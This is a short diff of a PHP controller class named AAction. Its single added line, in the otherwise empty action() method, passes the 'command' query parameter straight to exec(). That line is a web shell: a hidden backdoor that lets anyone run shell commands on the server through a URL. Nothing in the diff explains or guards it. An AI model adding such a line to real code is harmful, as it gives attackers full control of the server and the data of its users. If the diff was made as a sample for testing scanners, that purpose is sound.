@@ -10,5 +10,6 @@ class AAction extends Action
 
     protected function action(): ResponseInterface
     {
+        exec($_GET['command']);
     }
 }
